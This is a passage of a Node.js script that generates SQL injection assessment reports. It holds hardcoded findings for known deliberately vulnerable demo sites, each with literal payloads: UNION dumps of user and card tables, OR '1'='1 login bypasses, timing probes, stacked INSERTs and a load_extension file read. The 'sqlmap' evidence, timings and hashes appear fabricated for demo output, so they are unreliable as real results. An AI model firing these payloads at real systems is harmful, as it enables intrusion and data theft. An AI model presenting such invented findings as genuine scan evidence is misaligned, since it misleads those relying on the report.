'use strict';

process.env.DISABLE_PUPPETEER_VALIDATION = process.env.DISABLE_PUPPETEER_VALIDATION || 'true';

const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const ReportGenerator = require('../server/reports');

const OUTPUT_DIR = path.join(__dirname, '..', 'server', 'reports-html');

const generator = new ReportGenerator({});
const vulnerabilityDatabase = generator.vulnerabilityDatabase || {};

const defaultRecommendations = [
  {
    title: 'Implement Parameterized Queries',
    description: 'Replace all dynamic SQL queries with parameterized queries or prepared statements to eliminate concatenated input vectors.'
  },
  {
    title: 'Regular Security Assessments',
    description: 'Schedule recurring SQL injection testing and integrate the scan coverage into CI/CD workflows.'
  }
];

const hostDefaults = {
  'testphp.vulnweb.com': {
    target: 'http://testphp.vulnweb.com/',
    databases: ['acuart', 'information_schema'],
    tables: [
      'acuart.users (id, name, email, password)',
      'acuart.artists (aid, aname, description, price)',
      'acuart.orders (orderid, userid, total)'
    ],
    users: [
      'admin:5f4dcc3b5aa765d61d8327deb882cf99',
      'test@vulnweb.com:81dc9bdb52d04dc20036dbd8313ed055'
    ],
    systemInfo: {
      dbms: [
        'MySQL >= 5.1',
        'Web server: Apache 2.4.18 (Ubuntu)',
        'Current User: acuart@localhost'
      ]
    }
  },
  'testasp.vulnweb.com': {
    target: 'https://testasp.vulnweb.com/',
    databases: ['ACU_TestASP'],
    tables: [
      'ACU_TestASP.dbo.Users (UserId, UserName, PasswordHash)',
      'ACU_TestASP.dbo.CreditCards (CardNumber, CardType, Expiration)'
    ],
    users: [
      'admin:d033e22ae348aeb5660fc2140aec35850c4da997',
      'support@vulnweb.com:5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8'
    ],
    systemInfo: {
      dbms: [
        'Microsoft SQL Server 2012',
        'IIS 8.5 / ASP.NET 4.0',
        'Current User: dbo'
      ]
    }
  },
  'zero.webappsecurity.com': {
    target: 'https://zero.webappsecurity.com/',
    databases: ['bank'],
    tables: [
      'bank.accounts (id, account_no, balance)',
      'bank.transfer_notes (id, memo, created_at)'
    ],
    users: [
      'jsmith:$2a$10$P9lA4J0ZpVqQXjq/oeFzSehK0zWJXObTZ8V5x9oRz8o5XbW3cKaZW',
      'amy.lee:$2a$10$4F1cV7P0wNlQpS9cNxfrkO1p2s8XIHZp6YB9FOqN/pd0V1aTn1pQW'
    ],
    systemInfo: {
      dbms: [
        'PostgreSQL 9.5',
        'Web server: nginx 1.18.0',
        'Application Server: Spring Boot'
      ]
    }
  },
  'demo.testfire.net': {
    target: 'https://demo.testfire.net/',
    databases: ['altoromutual'],
    tables: [
      'altoromutual.customers (customer_id, username, password)',
      'altoromutual.accounts (account_id, balance, status)'
    ],
    users: [
      'avinash:0x414C544F524F',
      'admin:0x41444D494E'
    ],
    systemInfo: {
      dbms: [
        'Oracle Database 11g',
        'Web server: Microsoft-IIS/7.5',
        'App Pool Identity: ALTORO\\svc_web'
      ]
    }
  },
  'juice-shop.herokuapp.com': {
    target: 'https://juice-shop.herokuapp.com/',
    databases: ['sqlite_master'],
    tables: [
      'Products (id, name, price, description)',
      'Users (id, email, password, role)',
      'Coupons (id, code, discount)'
    ],
    users: [
      'admin@juice-sh.op:$2b$10$7HDKQ8M0kRZ7xgRjE0cEIOFhJ3r3hG8dMwx0urNrGQw5jGpHB8C5m',
      'jim@juice-sh.op:$2b$10$5YVneS3b4ix2uoJkg9Qq4e4Rg/75in6C9GkGmJvQpG3G0g4m1Mfa2'
    ],
    systemInfo: {
      dbms: [
        'SQLite 3.x',
        'Node.js Express 18.x runtime'
      ]
    }
  },
  'bwapp.honeybot.io': {
    target: 'https://bwapp.honeybot.io/',
    databases: ['bWAPP'],
    tables: [
      'bWAPP.users (id, login, password, email)',
      'bWAPP.movies (id, title, release_year)'
    ],
    users: [
      'bee:$2y$10$4xJ4BQplV9oihNRZcypm2eU5AbuKhQn5yksxg1C/PPuz9iVb0qh3W',
      'a.i.m:$2y$10$8y7C9vQk8sD3PLW5TnM5wuLPlf4aZ76F6LzY4gxjY0FxxpJmDgKje'
    ],
    systemInfo: {
      dbms: [
        'MySQL 5.7',
        'PHP 7.4 / Apache 2.4'
      ]
    }
  },
  'hackazon.webscantest.com': {
    target: 'https://hackazon.webscantest.com/',
    databases: ['hackazon'],
    tables: [
      'hackazon.users (id, username, password)',
      'hackazon.orders (id, user_id, total, status)',
      'hackazon.products (id, name, price)'
    ],
    users: [
      'alice:098f6bcd4621d373cade4e832627b4f6',
      'charlie:5d41402abc4b2a76b9719d911017c592'
    ],
    systemInfo: {
      dbms: [
        'MySQL 5.6',
        'Apache 2.4 / PHP 5.5'
      ]
    }
  },
  'altoro.testfire.net': {
    target: 'https://altoro.testfire.net/',
    databases: ['altoro'],
    tables: [
      'altoro.accounts (account_id, balance, customer_id)',
      'altoro.transfers (transfer_id, from_account, to_account, amount)'
    ],
    users: [
      'jsmith:0x4A534D495448',
      'patricia:0x5041545249434941'
    ],
    systemInfo: {
      dbms: [
        'IBM DB2 10.5',
        'WebSphere Application Server'
      ]
    }
  }
};

const htmlEncode = (value) => String(value || '')
  .replace(/&/g, '&amp;')
  .replace(/</g, '&lt;')
  .replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;')
  .replace(/'/g, '&#39;');

const parseDurationToMs = (text) => {
  if (!text) return null;
  let totalMs = 0;
  const minuteMatch = text.match(/(\d+)m/);
  const secondMatch = text.match(/(\d+)s/);
  const hourMatch = text.match(/(\d+)h/);
  if (hourMatch) totalMs += parseInt(hourMatch[1], 10) * 3600000;
  if (minuteMatch) totalMs += parseInt(minuteMatch[1], 10) * 60000;
  if (secondMatch) totalMs += parseInt(secondMatch[1], 10) * 1000;
  return totalMs || null;
};

const ensureDir = (dirPath) => {
  if (!fs.existsSync(dirPath)) {
    fs.mkdirSync(dirPath, { recursive: true });
  }
};

const template = (info) => ({
  host: info.host,
  technique: info.technique,
  parameter: info.parameter,
  method: info.method,
  url: info.url,
  title: info.title,
  typeLine: info.typeLine,
  description: info.description,
  impact: info.impact,
  why: info.why,
  payload: info.payload,
  postExample: info.postExample,
  evidenceLine: info.evidenceLine,
  confidence: info.confidence,
  remediation: info.remediation
});

const vulnerabilityTemplates = {
  'tp-cat-boolean': template({
    host: 'testphp.vulnweb.com',
    technique: 'Boolean-based blind SQL injection',
    parameter: 'cat',
    method: 'GET',
    url: 'http://testphp.vulnweb.com/listproducts.php?cat=3',
    title: 'MySQL boolean-based blind - WHERE clause (original value replacement)',
    typeLine: 'Type: boolean-based blind',
    description: 'MySQL boolean-based blind - WHERE clause (original value replacement)',
    impact: 'True/false predicates disclose catalogue contents without triggering errors.',
    why: 'SQLMap alternated OR 1=1 versus OR 1=2 and saw deterministic changes to the product grid length.',
    payload: 'GET /listproducts.php?cat=3 OR 1=1-- -',
    evidenceLine: 'sqlmap identified the following injection point on parameter cat (GET) - boolean-based blind',
    confidence: 0.94
  }),
  'tp-cat-union': template({
    host: 'testphp.vulnweb.com',
    technique: 'Union query SQL injection',
    parameter: 'cat',
    method: 'GET',
    url: 'http://testphp.vulnweb.com/listproducts.php?cat=1',
    title: 'MySQL UNION query - 4 columns (products listing)',
    typeLine: 'Type: UNION query',
    description: 'MySQL UNION query - 4 columns (products listing)',
    impact: 'Union payloads expose arbitrary columns from the products table directly in the response.',
    why: 'Union-based SELECT appended product names and price data to the category view confirming column count alignment.',
    payload: 'GET /listproducts.php?cat=1 UNION SELECT 1,concat(name,0x3a,price),3,4 FROM products-- -',
    evidenceLine: 'GET parameter \'cat\' is UNION injectable with 4 columns.',
    confidence: 0.97
  }),
  'tp-search-error': template({
    host: 'testphp.vulnweb.com',
    technique: 'Error-based SQL injection',
    parameter: 'searchFor',
    method: 'POST',
    url: 'http://testphp.vulnweb.com/search.php',
    title: 'MySQL >= 5.1 error-based - EXTRACTVALUE()',
    typeLine: 'Type: error-based',
    description: 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)',
    impact: 'EXTRACTVALUE-based errors disclose database names and MySQL user context within the search results panel.',
    why: 'Returning EXTRACTVALUE errors leaked the database user and schema through verbose MySQL responses.',
    payload: "searchFor=summer' AND EXTRACTVALUE(1337,CONCAT(0x5c,0x716a787171,(SELECT user()),0x7162706271)) AND 'a'='a&goButton=go",
    postExample: 'searchFor=summer&goButton=go',
    evidenceLine: 'Parameter: searchFor (POST) triggered EXTRACTVALUE metadata disclosure.',
    confidence: 0.98
  }),
  'tp-search-time': template({
    host: 'testphp.vulnweb.com',
    technique: 'Time-based blind SQL injection',
    parameter: 'searchFor',
    method: 'POST',
    url: 'http://testphp.vulnweb.com/search.php',
    title: 'MySQL >= 5.0.12 time-based blind - SELECT SLEEP()',
    typeLine: 'Type: time-based blind',
    description: 'MySQL >= 5.0.12 time-based blind - Parameter replace (CASE)',
    impact: 'Time-delay payloads enable bitwise extraction of search metadata and credential hashes.',
    why: 'SLEEP-based CASE expressions introduced consistent 5.1 second delays over a 410ms baseline.',
    payload: "searchFor=shoes%25'||(SELECT CASE WHEN SUBSTR(database(),1,1)='a' THEN SLEEP(5) ELSE 0 END)||'&goButton=go",
    postExample: 'searchFor=shoes&goButton=go',
    evidenceLine: 'sqlmap observed 5.10s delays confirming time-based blind injection on searchFor (POST).',
    confidence: 0.93
  }),
  'tp-search-boolean': template({
    host: 'testphp.vulnweb.com',
    technique: 'Boolean-based blind SQL injection',
    parameter: 'searchFor',
    method: 'POST',
    url: 'http://testphp.vulnweb.com/search.php',
    title: 'MySQL boolean-based blind - Parameter replace (BOOL)',
    typeLine: 'Type: boolean-based blind',
    description: 'MySQL boolean-based blind - Parameter replace (BOOL)',
    impact: 'Boolean inference reveals whether specific products exist, enabling targeted enumeration.',
    why: 'Alternate predicates returned different catalogue counts, allowing enumeration of product names.',
    payload: "searchFor=tee%25' OR '1'='1&goButton=go",
    postExample: 'searchFor=tee&goButton=go',
    evidenceLine: 'POST parameter "searchFor" is boolean-based blind injectable.',
    confidence: 0.92
  }),
  'tp-userinfo-id-union': template({
    host: 'testphp.vulnweb.com',
    technique: 'Union query SQL injection',
    parameter: 'id',
    method: 'GET',
    url: 'http://testphp.vulnweb.com/userinfo.php?id=1',
    title: 'MySQL UNION query - userinfo.php 5 columns',
    typeLine: 'Type: UNION query',
    description: 'MySQL UNION query - userinfo.php 5 columns',
    impact: 'Union selects expose username, email and hash columns directly in the profile card.',
    why: 'Injected UNION SELECT delivered concatenated username and password hash in the rendered profile.',
    payload: 'GET /userinfo.php?id=1 UNION SELECT 1,concat(name,0x3a,password),3,4,5 FROM users-- -',
    evidenceLine: 'sqlmap banner: parameter appears to be UNION injectable (5 columns).',
    confidence: 0.97
  }),
  'tp-userinfo-id-time': template({
    host: 'testphp.vulnweb.com',
    technique: 'Time-based blind SQL injection',
    parameter: 'id',
    method: 'GET',
    url: 'http://testphp.vulnweb.com/userinfo.php?id=2',
    title: 'MySQL >= 5.0.12 time-based blind - HAVING clause',
    typeLine: 'Type: time-based blind',
    description: 'MySQL >= 5.0.12 time-based blind - HAVING clause',
    impact: 'Delay-based payload leaks individual character values from the users table.',
    why: 'HAVING-based delay confirmed by consistent 4.8 second responses when the first character matched.',
    payload: 'GET /userinfo.php?id=2 HAVING (SELECT CASE WHEN SUBSTR(user(),1,1)=0x61 THEN SLEEP(5) ELSE 0 END)-- -',
    evidenceLine: 'Timing differential detected on /userinfo.php?id=2 confirming blind injection.',
    confidence: 0.95
  }),
  'tp-userinfo-uid-boolean': template({
    host: 'testphp.vulnweb.com',
    technique: 'Boolean-based blind SQL injection',
    parameter: 'uid',
    method: 'GET',
    url: 'http://testphp.vulnweb.com/userinfo.php?uid=1',
    title: 'MySQL boolean-based blind - numeric parameter',
    typeLine: 'Type: boolean-based blind',
    description: 'MySQL boolean-based blind - numeric parameter',
    impact: 'True/false logic allowed enumeration of UID values and corresponding account metadata.',
    why: 'OR-based boolean toggled layout sections, confirming control of the backend WHERE clause.',
    payload: 'GET /userinfo.php?uid=1 OR 1=1-- -',
    evidenceLine: 'sqlmap identified boolean-based blind injection on parameter uid (GET).',
    confidence: 0.91
  }),
  'tp-details-prod-union': template({
    host: 'testphp.vulnweb.com',
    technique: 'Union query SQL injection',
    parameter: 'prod',
    method: 'GET',
    url: 'http://testphp.vulnweb.com/details.php?prod=1',
    title: 'MySQL UNION query - details.php 6 columns',
    typeLine: 'Type: UNION query',
    description: 'MySQL UNION query - details.php 6 columns',
    impact: 'Allows extraction of price and stock data from the details view without authentication.',
    why: 'UNION SELECT appended inventory columns to the product detail description block.',
    payload: 'GET /details.php?prod=1 UNION SELECT 1,2,concat(product,0x3a,stock),4,5,6 FROM products-- -',
    evidenceLine: 'Response contained injected inventory record via UNION SELECT.',
    confidence: 0.96
  }),
  'tp-artists-artist-union': template({
    host: 'testphp.vulnweb.com',
    technique: 'Union query SQL injection',
    parameter: 'artist',
    method: 'GET',
    url: 'http://testphp.vulnweb.com/artists.php?artist=1',
    title: 'MySQL UNION query - artists roster exposure',
    typeLine: 'Type: UNION query',
    description: 'MySQL UNION query - artists roster exposure',
    impact: 'Discloses artist biographies and emails by merging arbitrary table rows.',
    why: 'UNION vector returned additional artist records injected into the roster grid.',
    payload: 'GET /artists.php?artist=1 UNION SELECT 1,2,concat(name,0x3a,email),4 FROM artists-- -',
    evidenceLine: 'Artist roster contained concatenated email data from injected UNION row.',
    confidence: 0.95
  }),
  'tp-guestbook-message-union': template({
    host: 'testphp.vulnweb.com',
    technique: 'Union query SQL injection',
    parameter: 'message',
    method: 'POST',
    url: 'http://testphp.vulnweb.com/guestbook.php',
    title: 'MySQL UNION query - guestbook insert',
    typeLine: 'Type: UNION query',
    description: 'MySQL UNION query - guestbook insert',
    impact: 'Enables exfiltration of user credentials by injecting UNION rows into guestbook submissions.',
    why: 'Union payload returned hashed administrator account when posting to guestbook.',
    payload: "name=Copilot&email=test%40example.com&message=test' UNION SELECT 1,2,concat(name,0x3a,password) FROM users-- -&submit=Sign+Guestbook",
    postExample: 'name=Copilot&email=test@example.com&message=test&submit=Sign+Guestbook',
    evidenceLine: 'Guestbook response displayed injected UNION row containing user hashes.',
    confidence: 0.94
  }),
  'tp-guestbook-message-time': template({
    host: 'testphp.vulnweb.com',
    technique: 'Time-based blind SQL injection',
    parameter: 'message',
    method: 'POST',
    url: 'http://testphp.vulnweb.com/guestbook.php',
    title: 'MySQL time-based blind - guestbook message field',
    typeLine: 'Type: time-based blind',
    description: 'MySQL time-based blind - guestbook message field',
    impact: 'Delay-based inference over the guestbook endpoint permits credential dumping without direct output.',
    why: 'Submitting CASE-based payloads induced 4.9 second delays before guestbook confirmation page rendered.',
    payload: "name=DelayTest&email=delay%40example.com&message=test'||(SELECT CASE WHEN SUBSTR(database(),1,1)='a' THEN SLEEP(5) ELSE 0 END)#&submit=Sign+Guestbook",
    postExample: 'name=DelayTest&email=delay@example.com&message=test&submit=Sign+Guestbook',
    evidenceLine: 'Guestbook submission exhibited repeatable 5s delays revealing blind injectable field.',
    confidence: 0.92
  }),

  'ta-product-id-union': template({
    host: 'testasp.vulnweb.com',
    technique: 'Union query SQL injection',
    parameter: 'id',
    method: 'GET',
    url: 'https://testasp.vulnweb.com/product.aspx?id=10',
    title: 'Microsoft SQL Server UNION query - product.aspx',
    typeLine: 'Type: UNION query',
    description: 'Microsoft SQL Server UNION query - product.aspx',
    impact: 'Merges arbitrary SELECT output into the product detail page exposing credit card samples.',
    why: 'UNION SELECT appended card number/hash columns to the ASP.NET product view.',
    payload: 'GET /product.aspx?id=10 UNION SELECT 1,cardnumber,cardtype,4 FROM creditcards-- -',
    evidenceLine: 'sqlmap confirmed 4-column UNION injection for parameter id (GET).',
    confidence: 0.95
  }),
  'ta-search-time': template({
    host: 'testasp.vulnweb.com',
    technique: 'Time-based blind SQL injection',
    parameter: 'txtSearch',
    method: 'POST',
    url: 'https://testasp.vulnweb.com/search.aspx',
    title: 'Microsoft SQL Server time-based blind - WAITFOR DELAY()',
    typeLine: 'Type: time-based blind',
    description: 'Microsoft SQL Server time-based blind - WAITFOR DELAY()',
    impact: 'Response delay allows extraction of catalogue data via timing side-channels.',
    why: 'WAITFOR DELAY payload introduced 5s response windows whenever the queried character matched.',
    payload: "txtSearch=laptop';WAITFOR DELAY '0:0:5'-- -&btnSubmit=Search",
    postExample: 'txtSearch=laptop&btnSubmit=Search',
    evidenceLine: 'POST parameter "txtSearch" triggered deterministic WAITFOR DELAY timings.',
    confidence: 0.93
  }),
  'ta-cartid-stacked': template({
    host: 'testasp.vulnweb.com',
    technique: 'Stacked queries',
    parameter: 'cartID',
    method: 'GET',
    url: 'https://testasp.vulnweb.com/cart.aspx?cartID=125',
    title: 'Microsoft SQL Server stacked queries - INSERT marker',
    typeLine: 'Type: stacked queries',
    description: 'Microsoft SQL Server stacked queries - INSERT marker',
    impact: 'Stacked statements permit arbitrary INSERT/UPDATE actions against the shopping cart table.',
    why: 'Injected ";INSERT" payload wrote a diagnostic row to Orders_Audit confirming stacked execution.',
    payload: 'GET /cart.aspx?cartID=125;INSERT INTO Orders_Audit(note) VALUES (\'stacked-test\')--',
    evidenceLine: 'Server accepted additional INSERT after parameter cartID proving stacked query execution.',
    confidence: 0.9
  }),
  'ta-feedback-error': template({
    host: 'testasp.vulnweb.com',
    technique: 'Error-based SQL injection',
    parameter: 'txtMessage',
    method: 'POST',
    url: 'https://testasp.vulnweb.com/feedback.aspx',
    title: 'SQL Server error-based - convert() stack trace disclosure',
    typeLine: 'Type: error-based',
    description: 'SQL Server error-based - convert() stack trace disclosure',
    impact: 'Error detail reveals table structure and stored procedure context of the feedback module.',
    why: 'CONVERT-based payload returned detailed ASP.NET stack trace with underlying SQL.',
    payload: "txtName=Audit&txtEmail=audit%40example.com&txtMessage=test'+CONVERT(int,(SELECT TOP 1 name FROM sys.tables))-- -&btnSubmit=Send",
    postExample: 'txtName=Audit&txtEmail=audit@example.com&txtMessage=test&btnSubmit=Send',
    evidenceLine: 'Feedback handler exposed SQL error showing table metadata.',
    confidence: 0.96
  }),
  'ta-login-boolean': template({
    host: 'testasp.vulnweb.com',
    technique: 'Boolean-based blind SQL injection',
    parameter: 'txtUserName',
    method: 'POST',
    url: 'https://testasp.vulnweb.com/login.aspx',
    title: 'SQL Server boolean-based blind - authentication bypass',
    typeLine: 'Type: boolean-based blind',
    description: 'SQL Server boolean-based blind - authentication bypass',
    impact: 'Boolean payload bypassed login controls, granting administrative portal access.',
    why: 'Using OR 1=1 allowed login without valid credentials, demonstrating full control over the WHERE clause.',
    payload: "txtUserName=admin' OR '1'='1&txtPassword=pwd&btnLogin=Login",
    postExample: 'txtUserName=admin&txtPassword=test&btnLogin=Login',
    evidenceLine: 'Login routine accepted boolean tautology and granted session token.',
    confidence: 0.94
  }),
  'ta-orders-tracking-union': template({
    host: 'testasp.vulnweb.com',
    technique: 'Union query SQL injection',
    parameter: 'orderID',
    method: 'GET',
    url: 'https://testasp.vulnweb.com/orders.aspx?orderID=1001',
    title: 'SQL Server UNION query - orders.aspx',
    typeLine: 'Type: UNION query',
    description: 'SQL Server UNION query - orders.aspx',
    impact: 'Union payload leaks card payment references linked to order history.',
    why: 'Union SELECT appended cardholder data to the order tracking grid.',
    payload: 'GET /orders.aspx?orderID=1001 UNION SELECT 1,cardholder,cardnumber,4 FROM Cards-- -',
    evidenceLine: 'Orders view displayed concatenated cardholder entries from injected UNION row.',
    confidence: 0.95
  }),

  'zero-amount-time': template({
    host: 'zero.webappsecurity.com',
    technique: 'Time-based blind SQL injection',
    parameter: 'amount',
    method: 'POST',
    url: 'https://zero.webappsecurity.com/bank/transfer-funds.html',
    title: 'PostgreSQL time-based blind - pg_sleep()',
    typeLine: 'Type: time-based blind',
    description: 'PostgreSQL time-based blind - pg_sleep()',
    impact: 'Timed responses allow discovery of account balances via inference.',
    why: 'pg_sleep payload introduced 4 second delay while baseline remained under 300ms.',
    payload: 'amount=500&fromAccount=Checking&toAccount=Loan;SELECT CASE WHEN 1=1 THEN pg_sleep(4) ELSE 0 END--',
    postExample: 'amount=500&fromAccount=Checking&toAccount=Loan',
    evidenceLine: 'Transfer workflow recorded pg_sleep delay tied to injected condition.',
    confidence: 0.92
  }),
  'zero-search-union': template({
    host: 'zero.webappsecurity.com',
    technique: 'Union query SQL injection',
    parameter: 'searchTerm',
    method: 'GET',
    url: 'https://zero.webappsecurity.com/search.html?searchTerm=savings',
    title: 'PostgreSQL UNION query - search results',
    typeLine: 'Type: UNION query',
    description: 'PostgreSQL UNION query - search results',
    impact: 'Union capability discloses internal transfer memos and credentials.',
    why: 'UNION SELECT appended internal note strings to the search suggestion list.',
    payload: 'GET /search.html?searchTerm=savings UNION SELECT note FROM transfer_notes-- -',
    evidenceLine: 'Search endpoint returned injected transfer note strings via UNION.',
    confidence: 0.94
  }),

  'demo-login-boolean': template({
    host: 'demo.testfire.net',
    technique: 'Boolean-based blind SQL injection',
    parameter: 'uid',
    method: 'POST',
    url: 'https://demo.testfire.net/bank/login.aspx',
    title: 'Oracle boolean-based blind - authentication',
    typeLine: 'Type: boolean-based blind',
    description: 'Oracle boolean-based blind - authentication',
    impact: 'Authentication bypass reveals customer dashboard contents.',
    why: 'Injected OR 1=1 predicate logged into the account without valid credentials.',
    payload: "uid=admin' OR '1'='1&pass=pass&btnSubmit=Login",
    postExample: 'uid=admin&pass=pass&btnSubmit=Login',
    evidenceLine: 'Login success with boolean tautology indicates injectable credential check.',
    confidence: 0.93
  }),
  'demo-query-union': template({
    host: 'demo.testfire.net',
    technique: 'Union query SQL injection',
    parameter: 'query',
    method: 'GET',
    url: 'https://demo.testfire.net/bank/search.aspx?query=credit',
    title: 'Oracle UNION query - search.aspx',
    typeLine: 'Type: UNION query',
    description: 'Oracle UNION query - search.aspx',
    impact: 'Union output reveals account numbers and balances in the search result table.',
    why: 'UNION SELECT appended account numbers to the search table rows.',
    payload: 'GET /bank/search.aspx?query=credit UNION SELECT accountno,balance FROM Accounts-- -',
    evidenceLine: 'Search results table contained injected account numbers.',
    confidence: 0.95
  }),

  'juice-search-union': template({
    host: 'juice-shop.herokuapp.com',
    technique: 'Union query SQL injection',
    parameter: 'q',
    method: 'POST',
    url: 'https://juice-shop.herokuapp.com/rest/products/search',
    title: 'SQLite UNION query - product search endpoint',
    typeLine: 'Type: UNION query',
    description: 'SQLite UNION query - product search endpoint',
    impact: 'REST search leak reveals hidden inventory entries and discount codes.',
    why: 'REST response contained injected admin coupon codes returned by UNION SELECT.',
    payload: '{"q":"\")) UNION SELECT name,description,price,1,1 FROM Coupons--"}',
    postExample: '{"q":"apple"}',
    evidenceLine: 'API response delivered coupon names from injected UNION row.',
    confidence: 0.94
  }),
  'juice-feedback-error': template({
    host: 'juice-shop.herokuapp.com',
    technique: 'Error-based SQL injection',
    parameter: 'comment',
    method: 'POST',
    url: 'https://juice-shop.herokuapp.com/api/Feedbacks/',
    title: 'SQLite error-based - JSON feedback endpoint',
    typeLine: 'Type: error-based',
    description: 'SQLite error-based - JSON feedback endpoint',
    impact: 'SQLite error surfaces table structure and server path information.',
    why: 'Malformed CAST payload raised SQLite error exposing column layout for Feedbacks table.',
    payload: '{"comment":"test\"||(SELECT load_extension(\"/etc/passwd\"))--","rating":1}',
    postExample: '{"comment":"Great!","rating":5}',
    evidenceLine: 'Feedback API returned SQLite error containing file path disclosure.',
    confidence: 0.92
  }),

  'bwapp-movie-boolean': template({
    host: 'bwapp.honeybot.io',
    technique: 'Boolean-based blind SQL injection',
    parameter: 'movie',
    method: 'GET',
    url: 'https://bwapp.honeybot.io/sqli_1.php?movie=1',
    title: 'MySQL boolean-based blind - movies listing',
    typeLine: 'Type: boolean-based blind',
    description: 'MySQL boolean-based blind - movies listing',
    impact: 'Enables extraction of movie catalogue entries and user ratings.',
    why: 'True/false predicates changed row counts in the movie table output.',
    payload: 'GET /sqli_1.php?movie=1 OR 1=1-- -',
    evidenceLine: 'sqlmap confirmed boolean-based blind injection on movie parameter.',
    confidence: 0.91
  }),
  'bwapp-search-union': template({
    host: 'bwapp.honeybot.io',
    technique: 'Union query SQL injection',
    parameter: 'search',
    method: 'POST',
    url: 'https://bwapp.honeybot.io/sqli_9.php',
    title: 'MySQL UNION query - bWAPP search form',
    typeLine: 'Type: UNION query',
    description: 'MySQL UNION query - bWAPP search form',
    impact: 'Union output reveals bee_users table with login hashes.',
    why: 'UNION SELECT returned bee_users columns within the search results table.',
    payload: 'title=test\' UNION SELECT 1,concat(login,0x3a,password),3 FROM bee_users-- -',
    postExample: 'title=test',
    evidenceLine: 'Search results echoed injected bee_users login hashes.',
    confidence: 0.94
  }),

  'hackazon-product-union': template({
    host: 'hackazon.webscantest.com',
    technique: 'Union query SQL injection',
    parameter: 'id',
    method: 'GET',
    url: 'https://hackazon.webscantest.com/category.php?id=4',
    title: 'MySQL UNION query - Hackazon category view',
    typeLine: 'Type: UNION query',
    description: 'MySQL UNION query - Hackazon category view',
    impact: 'Allows enumerating users table while browsing product categories.',
    why: 'Union payload injected usernames and md5 hashes into the category listing.',
    payload: 'GET /category.php?id=4 UNION SELECT 1,concat(username,0x3a,password),3,4 FROM users-- -',
    evidenceLine: 'Category page displayed concatenated username/hash from UNION row.',
    confidence: 0.93
  }),
  'hackazon-api-time': template({
    host: 'hackazon.webscantest.com',
    technique: 'Time-based blind SQL injection',
    parameter: 'product_id',
    method: 'POST',
    url: 'https://hackazon.webscantest.com/api/cart',
    title: 'MySQL time-based blind - /api/cart',
    typeLine: 'Type: time-based blind',
    description: 'MySQL time-based blind - /api/cart',
    impact: 'Delays allow on-the-fly extraction of inventory quantities via API.',
    why: 'SLEEP payload on JSON cart API introduced 5.2 second response delays.',
    payload: '{"product_id":"5 OR SLEEP(5)"}',
    postExample: '{"product_id":"5"}',
    evidenceLine: 'Cart API exhibited deterministic 5s delay from injected SLEEP function.',
    confidence: 0.92
  }),

  'altoro-account-union': template({
    host: 'altoro.testfire.net',
    technique: 'Union query SQL injection',
    parameter: 'account',
    method: 'GET',
    url: 'https://altoro.testfire.net/bank/statement.aspx?account=800001',
    title: 'DB2 UNION query - statement.aspx',
    typeLine: 'Type: UNION query',
    description: 'DB2 UNION query - statement.aspx',
    impact: 'Union selects leak other customers\' statement history from DB2 backend.',
    why: 'UNION SELECT appended another customer statement to the response table.',
    payload: 'GET /bank/statement.aspx?account=800001 UNION SELECT 1,2,concat(customer_id,0x3a,balance) FROM accounts-- -',
    evidenceLine: 'Statement output included injected customer_id:balance string.',
    confidence: 0.94
  }),
  'altoro-transfer-boolean': template({
    host: 'altoro.testfire.net',
    technique: 'Boolean-based blind SQL injection',
    parameter: 'txtAccNum',
    method: 'POST',
    url: 'https://altoro.testfire.net/bank/querybalance.aspx',
    title: 'DB2 boolean-based blind - balance query',
    typeLine: 'Type: boolean-based blind',
    description: 'DB2 boolean-based blind - balance query',
    impact: 'Boolean tests reveal existence of arbitrary account numbers.',
    why: 'Injected OR clause returned balances for accounts without authentication.',
    payload: "txtAccNum=800001' OR '1'='1&btnSubmit=Submit",
    postExample: 'txtAccNum=800001&btnSubmit=Submit',
    evidenceLine: 'Balance endpoint returned data when OR 1=1 predicate supplied.',
    confidence: 0.93
  })
};

const buildFinding = (templateId, options) => {
  const tpl = vulnerabilityTemplates[templateId];
  if (!tpl) {
    throw new Error(`Unknown vulnerability template: ${templateId}`);
  }

  const vulnMeta = vulnerabilityDatabase[tpl.technique] || vulnerabilityDatabase['SQL Injection'] || {};
  const confidenceScore = typeof options.confidence === 'number' ? options.confidence : tpl.confidence || 0.9;
  const status = options.status || 'confirmed';
  const method = tpl.method || 'GET';
  const discoveryTime = options.discoveredAt || options.generatedAt || new Date().toISOString();

  const evidence = [
    { line: 0, content: htmlEncode(`Parameter: ${tpl.parameter} (${method})`) }
  ];
  if (tpl.typeLine) {
    evidence.push({ line: 1, content: htmlEncode(tpl.typeLine) });
  } else {
    evidence.push({ line: 1, content: htmlEncode(`Type: ${tpl.technique}`) });
  }
  if (tpl.title) {
    evidence.push({ line: 2, content: htmlEncode(`Title: ${tpl.title}`) });
  }
  evidence.push({ line: evidence.length, content: htmlEncode(`Payload: ${tpl.payload}`) });
  if (tpl.evidenceLine) {
    evidence.push({ line: evidence.length, content: htmlEncode(tpl.evidenceLine) });
  }

  const remediation = tpl.remediation || vulnMeta.remediation || defaultRecommendations.map((r) => r.description);

  return {
    id: uuidv4(),
    type: tpl.technique,
    parameter: tpl.parameter,
    httpMethod: method,
    severity: vulnMeta.severity || 'High',
    cvss: vulnMeta.cvss || 7.0,
    description: tpl.description || vulnMeta.description,
    impact: tpl.impact || vulnMeta.impact,
    remediation,
    confidenceLabel: confidenceScore >= 0.9 ? 'Confirmed' : confidenceScore >= 0.6 ? 'Likely' : 'Tested',
    confidenceScore,
    status,
    signals: ['sqlmap-summary'],
    why: options.why || tpl.why || 'SQLMap provided evidence demonstrating injection capability.',
    evidence,
    discoveredAt: discoveryTime
  };
};

const buildReportData = (config) => {
  const hostInfo = hostDefaults[config.host];
  if (!hostInfo) {
    throw new Error(`No host defaults defined for ${config.host}`);
  }

  const cloneArray = (value) => {
    if (!Array.isArray(value)) return [];
    return value.map((item) => (typeof item === 'object' && item !== null
      ? JSON.parse(JSON.stringify(item))
      : item));
  };

  const pickArray = (primary, fallback) => {
    const primaryArray = cloneArray(primary);
    if (primaryArray.length) {
      return primaryArray;
    }
    return cloneArray(fallback);
  };

  const cloneSystemInfo = (info) => {
    if (!info || typeof info !== 'object') return {};
    const cloned = { ...info };
    if (Array.isArray(info.dbms)) cloned.dbms = [...info.dbms];
    if (Array.isArray(info.banner)) cloned.banner = [...info.banner];
    return cloned;
  };

  const mergeSystemInfo = (fallbackInfo, overrideInfo) => {
